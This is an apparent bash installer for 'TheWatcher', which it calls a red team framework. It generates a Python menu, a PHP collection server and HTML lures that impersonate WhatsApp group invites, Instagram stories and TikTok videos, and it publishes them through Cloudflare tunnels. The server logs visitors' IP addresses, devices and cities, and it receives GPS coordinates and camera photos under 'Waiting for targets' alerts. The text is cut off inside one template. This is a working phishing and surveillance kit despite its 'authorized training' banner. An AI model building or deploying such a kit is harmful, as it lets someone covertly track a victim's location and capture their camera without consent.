#!/usr/bin/env bash
set -e

# ==================== COLORS ====================
RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
CYAN='\033[96m'
WHITE='\033[97m'
GRAY='\033[90m'
BOLD='\033[1m'
END='\033[0m'

# ==================== DETECT SYSTEM ====================
detect_system() {
    if [[ -d "/data/data/com.termux/files/usr" ]]; then
        SYSTEM="termux"
        PREFIX="/data/data/com.termux/files/usr"
        PYTHON_CMD="python"
    elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
        SYSTEM="linux"
        PREFIX="/usr/local"
        PYTHON_CMD="python3"
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        SYSTEM="macos"
        PREFIX="/usr/local"
        PYTHON_CMD="python3"
    else
        SYSTEM="unknown"
        PYTHON_CMD="python3"
    fi
}

# ==================== BANNER ====================
banner() {
    clear
    echo -e "${RED}${BOLD}"
    echo '      ▄▄▄█████▓ ██░ ██ ▓█████     █     █░ ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  '
    echo '      ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀    ▓█░ █ ░█░▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒'
    echo '      ▒ ▓██░ ▒░▒██▀▀██░▒███      ▒█░ █ ░█ ▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒'
    echo '      ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄    ░█░ █ ░█ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  '
    echo '        ▒██▒ ░ ░▓█▒░██▓░▒████▒   ░░██▒██▓  ▓█   ▓██▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒'
    echo '        ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░   ░ ▓░▒ ▒   ▒▒   ▓▒█░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░'
    echo '          ░     ▒ ░▒░ ░ ░ ░  ░     ▒ ░ ░    ▒   ▒▒ ░   ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░'
    echo '        ░       ░  ░░ ░   ░        ░   ░    ░   ▒    ░      ░         ░  ░░ ░   ░     ░░   ░ '
    echo '                ░  ░  ░   ░  ░       ░          ░  ░        ░ ░       ░  ░  ░   ░  ░   ░     '
    echo '                            ~EvilmaxSec | Tz~'
    echo -e "${END}"
    echo -e "${CYAN}${BOLD}"
    echo '╔═══════════════════════════════════════════════════════════════════════════╗'
    echo '║                    TheWatcher Installer                  ║'
    echo '║                      Auto-Detects & Installs Everything                   ║'
    echo '╚═══════════════════════════════════════════════════════════════════════════╝'
    echo -e "${END}\n"
}

# ==================== PRINT FUNCTIONS ====================
print_success() { echo -e "  ${GREEN}✓${END} ${WHITE}$1${END}"; }
print_error() { echo -e "  ${RED}✗${END} ${WHITE}$1${END}"; }
print_info() { echo -e "  ${BLUE}ℹ${END} ${WHITE}$1${END}"; }
print_warning() { echo -e "  ${YELLOW}⚠${END} ${WHITE}$1${END}"; }

# ==================== INSTALL PHP ====================
install_php() {
    print_info "Installing PHP..."
    
    if [[ "$SYSTEM" == "termux" ]]; then
        pkg update -y 2>/dev/null || true
        pkg install php -y 2>/dev/null || {
            print_warning "Retrying PHP installation..."
            pkg upgrade -y 2>/dev/null || true
            pkg install php -y 2>/dev/null || true
        }
    elif [[ "$SYSTEM" == "linux" ]]; then
        if command -v apt &>/dev/null; then
            sudo apt update -y 2>/dev/null || true
            sudo apt install php -y 2>/dev/null || true
        elif command -v yum &>/dev/null; then
            sudo yum install php -y 2>/dev/null || true
        elif command -v pacman &>/dev/null; then
            sudo pacman -S php --noconfirm 2>/dev/null || true
        fi
    elif [[ "$SYSTEM" == "macos" ]]; then
        if command -v brew &>/dev/null; then
            brew install php 2>/dev/null || true
        fi
    fi
    
    if command -v php &>/dev/null; then
        print_success "PHP installed: $(php -v | head -1 | cut -d' ' -f2)"
        return 0
    else
        print_warning "PHP installation failed, continuing anyway..."
        return 1
    fi
}

# ==================== INSTALL PYTHON DEPS ====================
install_python_deps() {
    print_info "Installing Python dependencies..."
    
    # Install pip if needed
    if ! command -v pip &>/dev/null && ! command -v pip3 &>/dev/null; then
        if [[ "$SYSTEM" == "termux" ]]; then
            pkg install python-pip -y 2>/dev/null || true
        elif [[ "$SYSTEM" == "linux" ]]; then
            sudo apt install python3-pip -y 2>/dev/null || true
        fi
    fi
    
    # Install requests (essential)
    if pip install requests -q 2>/dev/null || pip3 install requests -q 2>/dev/null; then
        print_success "requests installed"
    else
        print_warning "requests installation failed"
    fi
    
    # Install pillow (optional, skip on Termux)
    if [[ "$SYSTEM" != "termux" ]]; then
        if pip install pillow -q 2>/dev/null || pip3 install pillow -q 2>/dev/null; then
            print_success "pillow installed"
        else
            print_warning "pillow installation failed (optional)"
        fi
    else
        print_info "pillow skipped for Termux (optional)"
    fi
}

# ==================== INSTALL CLOUDFLARED ====================
install_cloudflared() {
    echo ""
    read -p "$(echo -e "  ${YELLOW}?${END} ${WHITE}Install Cloudflared for public URLs? (y/N): ${END}")" -n 1 -r
    echo ""
    
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        print_info "Skipping Cloudflared installation"
        return 0
    fi
    
    print_info "Installing Cloudflared..."
    
    if [[ "$SYSTEM" == "termux" ]]; then
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        chmod +x cloudflared
        mv cloudflared $PREFIX/bin/
    elif [[ "$SYSTEM" == "linux" ]]; then
        ARCH=$(uname -m)
        if [[ "$ARCH" == "aarch64" ]] || [[ "$ARCH" == "arm64" ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        elif [[ "$ARCH" == "armv7l" ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
        else
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
        fi
        chmod +x cloudflared
        sudo mv cloudflared /usr/local/bin/
    elif [[ "$SYSTEM" == "macos" ]]; then
        brew install cloudflared 2>/dev/null || true
    fi
    
    if command -v cloudflared &>/dev/null; then
        print_success "Cloudflared installed"
    else
        print_warning "Cloudflared installation failed"
    fi
}

# ==================== CREATE FILES ====================
create_files() {
    print_info "Creating TheWatcher files..."
    
    cd "$INSTALL_DIR"
    
    # Create directories
    mkdir -p data templates modules logs
    
    # Create thewatcher.py
    cat > thewatcher.py << 'THEWATCHER_EOF'
#!/usr/bin/env python3
"""
TheWatcher v2.0 - Professional Red Team Framework
Author: EvilmaxSec
"""

import os
import sys
import time
import json
import subprocess
import threading
import re
import socket

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    BOLD = '\033[1m'
    END = '\033[0m'

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    clear()
    print(f"""{Colors.RED}{Colors.BOLD}
      ▄▄▄█████▓ ██░ ██ ▓█████     █     █░ ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  
      ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀    ▓█░ █ ░█░▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
      ▒ ▓██░ ▒░▒██▀▀██░▒███      ▒█░ █ ░█ ▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒
      ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄    ░█░ █ ░█ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  
        ▒██▒ ░ ░▓█▒░██▓░▒████▒   ░░██▒██▓  ▓█   ▓██▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒
        ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░   ░ ▓░▒ ▒   ▒▒   ▓▒█░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
          ░     ▒ ░▒░ ░ ░ ░  ░     ▒ ░ ░    ▒   ▒▒ ░   ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
        ░       ░  ░░ ░   ░        ░   ░    ░   ▒    ░      ░         ░  ░░ ░   ░     ░░   ░ 
                ░  ░  ░   ░  ░       ░          ░  ░        ░ ░       ░  ░  ░   ░  ░   ░     
                            ~EvilmaxSec | Tz~
{Colors.END}
{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}
{Colors.RED}{Colors.BOLD}║         TheWatcher v2.0 - Professional Security Framework       ║{Colors.END}
{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}
{Colors.GRAY}┌────────────────────────────────────────────────────────────────────────┐
│  {Colors.WHITE}Author: {Colors.RED}EvilmaxSec{Colors.GRAY}                                                     │
│  {Colors.WHITE}GitHub: {Colors.GRAY}https://github.com/EvilmaxSec{Colors.GRAY}                                       │
│  {Colors.RED}⚠  AUTHORIZED TRAINING USE ONLY  ⚠{Colors.GRAY}                                    │
└────────────────────────────────────────────────────────────────────────┘{Colors.END}
""")

def print_menu(title, options):
    print(f"\n{Colors.CYAN}{Colors.BOLD}┌─────────────────────────────────────────────────┐{Colors.END}")
    print(f"{Colors.CYAN}{Colors.BOLD}│          {title:<37}{Colors.CYAN}{Colors.BOLD}│{Colors.END}")
    print(f"{Colors.CYAN}{Colors.BOLD}├─────────────────────────────────────────────────┤{Colors.END}")
    for key, value in options.items():
        print(f"{Colors.CYAN}{Colors.BOLD}│{Colors.END}  {Colors.RED}[{key}]{Colors.END} {Colors.WHITE}{value:<39}{Colors.CYAN}{Colors.BOLD}│{Colors.END}")
    print(f"{Colors.CYAN}{Colors.BOLD}└─────────────────────────────────────────────────┘{Colors.END}")

def print_success(msg): print(f"  {Colors.GREEN}✓{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
def print_error(msg): print(f"  {Colors.RED}✗{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
def print_info(msg): print(f"  {Colors.BLUE}ℹ{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
def print_warning(msg): print(f"  {Colors.YELLOW}⚠{Colors.END} {Colors.WHITE}{msg}{Colors.END}")

def get_input(prompt, default=""):
    if default:
        val = input(f"  {Colors.RED}➜{Colors.END} {Colors.WHITE}{prompt}{Colors.GRAY} [{default}]:{Colors.END} ")
        return val if val else default
    return input(f"  {Colors.RED}➜{Colors.END} {Colors.WHITE}{prompt}:{Colors.END} ")

def get_number(prompt, min_val, max_val):
    while True:
        try:
            val = int(get_input(prompt))
            if min_val <= val <= max_val:
                return val
            print_error(f"Enter {min_val}-{max_val}")
        except ValueError:
            print_error("Enter a number")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def check_command(cmd):
    try:
        subprocess.run([cmd, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except FileNotFoundError:
        return False

def get_image_source(prompt_type):
    print(f"\n  {Colors.CYAN}📸 {prompt_type}{Colors.END}")
    print(f"  {Colors.GRAY}[1] Use image URL{Colors.END}")
    print(f"  {Colors.GRAY}[2] Use local image file{Colors.END}")
    
    choice = get_input("Choose option", "1")
    
    if choice == "1":
        return get_input("Enter image URL", "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop")
    else:
        while True:
            path = get_input("Enter local image path")
            if os.path.exists(path) and os.path.isfile(path):
                return path
            print_error(f"File not found: {path}")
            retry = get_input("Try again? (y/n)", "y")
            if retry.lower() != 'y':
                return "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"

def get_video_source():
    print(f"\n  {Colors.CYAN}🎬 Video Source{Colors.END}")
    print(f"  {Colors.GRAY}[1] Use video URL{Colors.END}")
    print(f"  {Colors.GRAY}[2] Use local video file{Colors.END}")
    
    choice = get_input("Choose option", "1")
    
    if choice == "1":
        return get_input("Enter video URL", "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4")
    else:
        while True:
            path = get_input("Enter local video path")
            if os.path.exists(path) and os.path.isfile(path):
                return path
            print_error(f"File not found: {path}")
            retry = get_input("Try again? (y/n)", "y")
            if retry.lower() != 'y':
                return "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"

def clear_old_data():
    if os.path.exists('data'):
        for f in os.listdir('data'):
            try:
                os.unlink(os.path.join('data', f))
            except:
                pass
    else:
        os.makedirs('data', exist_ok=True)

def monitor_data(stop_event):
    processed = set()
    while not stop_event.is_set():
        time.sleep(1)
        if os.path.exists('data'):
            current = set(os.listdir('data'))
            new_files = current - processed
            for f in new_files:
                if f.endswith('.json'):
                    try:
                        with open(f'data/{f}', 'r') as file:
                            data = json.load(file)
                            if 'coordinates' in data and data['coordinates'].get('latitude'):
                                print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
                                print(f"{Colors.GREEN}{Colors.BOLD}📍 NEW LOCATION CAPTURED!{Colors.END}")
                                print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
                                print(f"  {Colors.YELLOW}Time:{Colors.END} {data.get('timestamp')}")
                                print(f"  {Colors.YELLOW}IP:{Colors.END} {data.get('ip_address')}")
                                print(f"  {Colors.YELLOW}GPS:{Colors.END} {data['coordinates']['latitude']}, {data['coordinates']['longitude']}")
                                print(f"  {Colors.YELLOW}Device:{Colors.END} {data['device']['device']} | OS: {data['device']['os']}")
                                print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}\n")
                    except:
                        pass
                elif f.endswith('.jpg'):
                    size = os.path.getsize(f'data/{f}') // 1024
                    print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
                    print(f"{Colors.GREEN}{Colors.BOLD}📸 NEW CAMERA IMAGE!{Colors.END}")
                    print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
                    print(f"  {Colors.YELLOW}File:{Colors.END} {f} ({size}KB)")
                    print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}\n")
            processed = current

class TheWatcher:
    def __init__(self):
        self.monitor_thread = None
        self.php_process = None
        self.stop_monitor = threading.Event()
    
    def run_server(self, port, html):
        clear_old_data()
        os.makedirs('templates', exist_ok=True)
        with open('templates/current.html', 'w') as f:
            f.write(html)
        
        print_info(f"Starting server on port {port}...")
        
        if not check_command("php"):
            print_error("PHP not installed")
            sys.exit(1)
        
        self.stop_monitor.clear()
        self.monitor_thread = threading.Thread(target=monitor_data, args=(self.stop_monitor,), daemon=True)
        self.monitor_thread.start()
        
        self.php_process = subprocess.Popen(
            ["php", "-S", f"0.0.0.0:{port}", "server.php"],
            stderr=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            text=True,
            bufsize=1
        )
        
        def read_stderr():
            for line in iter(self.php_process.stderr.readline, ''):
                if line.strip():
                    if "Accepted" in line or "Closing" in line or "Development Server" in line:
                        continue
                    print(line.strip())
        
        threading.Thread(target=read_stderr, daemon=True).start()
        time.sleep(2)
        
        from modules.cloudflare import CloudflareTunnel
        cf = CloudflareTunnel()
        url = cf.start(port)
        local_ip = get_local_ip()
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}🌐 SHAREABLE LINKS{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.END}")
        if url:
            print_success(f"Cloudflare: {Colors.YELLOW}{url}{Colors.END}")
        print_success(f"Local: http://localhost:{port}")
        print_success(f"Network: http://{local_ip}:{port}")
        
        print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}║     🚀 TheWatcher Active!                            ║{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}║     📡 Waiting for targets...                       ║{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}║     🔴 Press Ctrl+C to stop                         ║{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}╚══════════════════════════════════════════════════════╝{Colors.END}\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print_warning("\nStopping server...")
            self.stop_monitor.set()
            if self.php_process:
                self.php_process.terminate()
            cf.stop()
    
    def location_menu(self):
        print(f"\n{Colors.BLUE}{Colors.BOLD}📍 LOCATION TRACKING{Colors.END}")
        print(f"{Colors.GRAY}{'─'*50}{Colors.END}")
        
        print_menu("SELECT TEMPLATE", {
            "1": "WhatsApp Group Invite",
            "2": "Instagram Story", 
            "3": "TikTok Video"
        })
        
        choice = get_number("Choose", 1, 3)
        from modules.templates import TemplateManager
        
        if choice == 1:
            name = get_input("Group name", "Security Group")
            image = get_image_source("Group Image")
            members = get_input("Members", "128")
            html = TemplateManager.get_whatsapp_location(name, image, members)
            port = get_number("Port (8080)", 1, 65535)
            self.run_server(port, html)
        elif choice == 2:
            username = get_input("Username", "instagram")
            verified = get_input("Verified? (y/n)", "n").lower() == 'y'
            profile = get_image_source("Profile Image")
            video = get_video_source()
            views = get_input("Views", "1.2M")
            likes = get_input("Likes", "125K")
            caption = get_input("Caption", "Check out my story!")
            html = TemplateManager.get_instagram_story_custom(username, verified, profile, video, views, likes, caption)
            port = get_number("Port (8080)", 1, 65535)
            self.run_server(port, html)
        elif choice == 3:
            username = get_input("Username", "tiktok")
            verified = get_input("Verified? (y/n)", "n").lower() == 'y'
            profile = get_image_source("Profile Image")
            video = get_video_source()
            views = get_input("Views", "1.2M")
            likes = get_input("Likes", "125K")
            comments = get_input("Comments", "12.5K")
            shares = get_input("Shares", "5.2K")
            caption = get_input("Caption", "Check this out!")
            html = TemplateManager.get_tiktok_video_custom(username, verified, profile, video, views, likes, comments, shares, caption)
            port = get_number("Port (8080)", 1, 65535)
            self.run_server(port, html)
    
    def camera_menu(self):
        print(f"\n{Colors.BLUE}{Colors.BOLD}📸 CAMERA ACCESS{Colors.END}")
        print(f"{Colors.GRAY}{'─'*50}{Colors.END}")
        
        print_menu("SELECT TEMPLATE", {
            "1": "Instagram Reel",
            "2": "TikTok Video"
        })
        
        choice = get_number("Choose", 1, 2)
        from modules.templates import TemplateManager
        
        if choice == 1:
            username = get_input("Username", "instagram")
            verified = get_input("Verified? (y/n)", "n").lower() == 'y'
            profile = get_image_source("Profile Image")
            video = get_video_source()
            likes = get_input("Likes", "1.2M")
            comments = get_input("Comments", "12.5K")
            shares = get_input("Shares", "5.2K")
            caption = get_input("Caption", "Amazing content!")
            html = TemplateManager.get_instagram_camera(username, verified, profile, video, likes, comments, shares, caption)
            port = get_number("Port (8080)", 1, 65535)
            self.run_server(port, html)
        elif choice == 2:
            username = get_input("Username", "tiktok")
            verified = get_input("Verified? (y/n)", "n").lower() == 'y'
            profile = get_image_source("Profile Image")
            video = get_video_source()
            likes = get_input("Likes", "1.2M")
            comments = get_input("Comments", "12.5K")
            shares = get_input("Shares", "5.2K")
            caption = get_input("Caption", "Check this out!")
            html = TemplateManager.get_tiktok_camera(username, verified, profile, video, likes, comments, shares, caption)
            port = get_number("Port (8080)", 1, 65535)
            self.run_server(port, html)
    
    def view_data(self):
        print(f"\n{Colors.BLUE}{Colors.BOLD}📊 COLLECTED DATA{Colors.END}")
        print(f"{Colors.GRAY}{'─'*50}{Colors.END}")
        
        if not os.path.exists('data') or not os.listdir('data'):
            print_warning("No data yet")
            input("\n  Press Enter...")
            return
        
        for f in os.listdir('data'):
            if f.endswith('.json'):
                try:
                    with open(f'data/{f}', 'r') as file:
                        data = json.load(file)
                        print(f"\n  {Colors.GREEN}📄 {f}{Colors.END}")
                        print(f"     {Colors.YELLOW}Time:{Colors.END} {data.get('timestamp')}")
                        print(f"     {Colors.YELLOW}IP:{Colors.END} {data.get('ip_address')}")
                        if 'coordinates' in data:
                            print(f"     {Colors.YELLOW}GPS:{Colors.END} {data['coordinates'].get('latitude')}, {data['coordinates'].get('longitude')}")
                except:
                    pass
            elif f.endswith('.jpg'):
                size = os.path.getsize(f'data/{f}') // 1024
                print(f"\n  {Colors.GREEN}📸 {f}{Colors.END} ({size}KB)")
        
        input("\n  Press Enter...")
    
    def main(self):
        while True:
            banner()
            print_menu("MAIN MENU", {
                "1": "📍 Track Location",
                "2": "📸 Access Camera",
                "3": "📊 View Data",
                "4": "🚪 Exit"
            })
            
            choice = get_input("\nSelect", "1")
            
            if choice == '1':
                self.location_menu()
            elif choice == '2':
                self.camera_menu()
            elif choice == '3':
                self.view_data()
            elif choice == '4':
                print_success("Goodbye!")
                sys.exit(0)
            else:
                print_error("Invalid")
                time.sleep(1)

if __name__ == "__main__":
    watcher = TheWatcher()
    watcher.main()
THEWATCHER_EOF

    chmod +x thewatcher.py
    print_success "Created: thewatcher.py"
    
    # Create server.php
    cat > server.php << 'SERVERPHP_EOF'
<?php
if (!is_dir('data')) mkdir('data',0755,true);
if (!is_dir('templates')) mkdir('templates',0755,true);
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') { http_response_code(200); exit(); }
$uri = strtok($_SERVER['REQUEST_URI'], '?');
function getIP(){ $ip=$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR']??'Unknown'; return trim(explode(',',$ip)[0]); }
function logMsg($type,$data){
    $out="\n".str_repeat("=",70)."\n".($type=='visit'?"🔴 NEW VISITOR DETECTED!":($type=='location'?"📍 LOCATION CAPTURED!":"📸 CAMERA CAPTURED!"))."\n".str_repeat("=",70)."\n";
    $out.="  📅 Time: ".date('Y-m-d H:i:s')."\n  🌐 IP: {$data['ip']}\n";
    if($type=='location') $out.="  📍 GPS: {$data['lat']}, {$data['lng']}\n";
    $out.="  📱 Device: {$data['device']}\n  💻 OS: {$data['os']}\n  🌍 Browser: {$data['browser']}\n";
    if($type!='camera') $out.="  🏙️ City: {$data['city']}\n";
    $out.="  💾 Saved: {$data['file']}\n".str_repeat("=",70)."\n";
    file_put_contents('php://stderr',$out);
}
function parseUA($ua){
    $l=strtolower($ua);
    $os='Unknown'; if(strpos($l,'android')!==false) $os='Android';
    elseif(strpos($l,'iphone')!==false) $os='iOS';
    elseif(strpos($l,'windows')!==false) $os='Windows';
    elseif(strpos($l,'mac')!==false) $os='macOS';
    elseif(strpos($l,'linux')!==false) $os='Linux';
    $browser='Unknown';
    if(strpos($l,'chrome')!==false && strpos($l,'edg')===false) $browser='Chrome';
    elseif(strpos($l,'firefox')!==false) $browser='Firefox';
    elseif(strpos($l,'safari')!==false && strpos($l,'chrome')===false) $browser='Safari';
    elseif(strpos($l,'edg')!==false) $browser='Edge';
    $device='Desktop'; if(strpos($l,'mobile')!==false) $device='Mobile Phone';
    elseif(strpos($l,'tablet')!==false) $device='Tablet';
    return ['os'=>$os,'browser'=>$browser,'device'=>$device];
}
function getGeo($ip){
    if($ip=='127.0.0.1'||strpos($ip,'192.168.')===0||strpos($ip,'10.')===0) return ['country'=>'Local','city'=>'Local'];
    $resp=@file_get_contents("http://ip-api.com/json/$ip");
    if($resp){ $data=json_decode($resp,true);
        if($data&&$data['status']=='success') return ['country'=>$data['country']??'Unknown','city'=>$data['city']??'Unknown'];
    }
    return ['country'=>'Unknown','city'=>'Unknown'];
}
if($uri=='/' && file_exists('templates/current.html')){
    $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
    $d=parseUA($ua); $g=getGeo($ip);
    logMsg('visit',['ip'=>$ip,'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'city'=>$g['city'],'country'=>$g['country'],'file'=>'N/A']);
    header('Content-Type:text/html'); readfile('templates/current.html'); exit();
}
if($uri=='/location' && $_SERVER['REQUEST_METHOD']=='POST'){
    $data=json_decode(file_get_contents('php://input'),true);
    if($data){
        $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
        $d=parseUA($ua); $g=getGeo($ip);
        $f="data/location_".time().".json";
        file_put_contents($f,json_encode(['timestamp'=>date('Y-m-d H:i:s'),'ip_address'=>$ip,'coordinates'=>['latitude'=>$data['lat'],'longitude'=>$data['lng'],'accuracy'=>$data['acc']],'device'=>$d,'network'=>$g],JSON_PRETTY_PRINT));
        logMsg('location',['ip'=>$ip,'lat'=>$data['lat'],'lng'=>$data['lng'],'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'city'=>$g['city'],'country'=>$g['country'],'file'=>$f]);
        header('Content-Type:application/json'); echo json_encode(['status'=>'ok']); exit();
    }
}
if($uri=='/camera' && $_SERVER['REQUEST_METHOD']=='POST' && isset($_FILES['image'])){
    $f="data/camera_".time().".jpg";
    move_uploaded_file($_FILES['image']['tmp_name'],$f);
    $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
    $d=parseUA($ua); $g=getGeo($ip);
    logMsg('camera',['ip'=>$ip,'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'city'=>$g['city'],'country'=>$g['country'],'file'=>$f]);
    header('Content-Type:application/json'); echo json_encode(['status'=>'ok']); exit();
}
if(file_exists('templates/current.html')) readfile('templates/current.html');
else echo "TheWatcher Ready";
?>
SERVERPHP_EOF

    print_success "Created: server.php"
    
    # Create modules
    mkdir -p modules
    
    cat > modules/__init__.py << 'EOF'
from .cloudflare import CloudflareTunnel
from .templates import TemplateManager
EOF

    cat > modules/cloudflare.py << 'EOF'
import subprocess, re, os, time
class CloudflareTunnel:
    def __init__(self): self.process=None; self.url=None; self.logfile=None
    def start(self, port):
        self.logfile=f"/tmp/cf_{port}.log"
        try:
            subprocess.run(["cloudflared","--version"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        except:
            return None
        cmd=f"cloudflared tunnel --url http://127.0.0.1:{port} --logfile {self.logfile}"
        self.process=subprocess.Popen(cmd,shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        for _ in range(30):
            time.sleep(1)
            if os.path.exists(self.logfile):
                with open(self.logfile,'r') as f:
                    m=re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com',f.read())
                    if m: self.url=m.group(0); return self.url
        return None
    def stop(self):
        if self.process: self.process.terminate()
        if self.logfile and os.path.exists(self.logfile): os.remove(self.logfile)
EOF

    cat > modules/templates.py << 'EOF'
#!/usr/bin/env python3
import os, base64

class TemplateManager:
    
    @staticmethod
    def get_whatsapp_location(name, img, members):
        src = img
        if os.path.exists(img) and os.path.isfile(img):
            with open(img,'rb') as f:
                d=base64.b64encode(f.read()).decode()
                m='image/png' if img.endswith('.png') else 'image/jpeg'
                src=f"data:{m};base64,{d}"
        return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>WhatsApp Group</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f0f2f5}}.header{{background:#075E54;color:#fff;padding:12px 16px}}.header-content{{max-width:500px;margin:0 auto;display:flex;align-items:center;gap:10px}}.main{{max-width:500px;margin:40px auto;padding:0 16px}}.card{{background:#fff;border-radius:24px;overflow:hidden;text-align:center;box-shadow:0 8px 30px rgba(0,0,0,0.1)}}.avatar{{width:100px;height:100px;border-radius:50%;margin:30px auto 15px;overflow:hidden;border:3px solid #25D366}}.avatar img{{width:100%;height:100%;object-fit:cover}}.name{{font-size:24px;font-weight:600;color:#075E54}}.type{{color:#666;font-size:13px}}.count{{display:inline-block;background:#e8f5e9;color:#075E54;padding:4px 12px;border-radius:20px;font-size:12px;margin:15px 0}}.btn{{background:#25D366;color:#fff;border:none;padding:14px 35px;border-radius:40px;font-size:16px;font-weight:600;margin:0 20px 30px;width:calc(100% - 40px);cursor:pointer}}.loading{{display:none;text-align:center;padding:50px;background:#fff;border-radius:24px}}.spinner{{width:40px;height:40px;border:3px solid #e0e0e0;border-top:3px solid #25D366;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px}}@keyframes spin{{to{{transform:rotate(360deg)}}}}.modal{{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);z-index:1000;justify-content:center;align-items:center}}.modal-content{{background:#fff;border-radius:20px;max-width:280px;width:90%;text-align:center;overflow:hidden}}.modal-title{{font-size:20px;font-weight:700;color:#075E54;padding:10px 20px}}.modal-msg{{color:#666;padding:10px 25px 20px;font-size:14px}}.modal-btn{{background:#25D366;color:#fff;border:none;padding:14px;width:100%;font-size:15px;font-weight:600;cursor:pointer}}.bottom-bar{{background:#075E54;color:#fff;padding:30px 16px 